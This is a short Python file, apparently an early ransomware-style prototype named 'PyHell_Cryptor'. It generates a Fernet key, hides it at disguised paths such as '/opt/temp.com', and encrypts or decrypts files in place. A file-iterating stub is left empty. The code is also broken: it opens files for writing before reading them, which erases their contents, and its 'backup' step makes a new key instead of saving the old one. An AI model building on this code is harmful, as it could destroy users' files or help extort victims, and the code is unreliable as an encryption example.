import os.path
import sys

from cryptography.fernet import Fernet
from bin.security.security_configuration import Settings


class PyHell_Cryptor:
    def __init__(self):
        self.key_home = ""
        if sys.platform == "win32":
            self.key_home = Settings.WINDOWS_KEY_LOCATION
        else:
            self.key_home = "/opt/temp.com"

        if not os.path.exists(self.key_home):
            self._gen_key()

        self.crypto_key = open(self.key_home, "r").read()

    def _gen_key(self, path=""):

        key = Fernet.generate_key()
        if len(path) > 0:
            with open(path, "wb") as key_file:
                key_file.write(key)
        else:
            with open(self.key_home, "wb") as key_file:
                key_file.write(key)

    def backup_key(self):
        self._gen_key(path="backup.com")

    def encrypt(self, file):
        init_key = self.crypto_key
        encry = Fernet(init_key)
        with open(file, "wb") as f:
            file_data = f.read()
            encrypted = encry.encrypt(file_data)
            f.write(encrypted)

    def decrypt(self, file):
        init_key = self.crypto_key
        decry = Fernet(init_key)
        with open(file, "wb") as f:
            file_data = f.read()
            decrypted = decry.decrypt(file_data)
            f.write(decrypted)


def PyHell_Iterator(type="encry"):
    """

    :param type: encry - encrypt files / decry - decrypt files
    :return:
    """
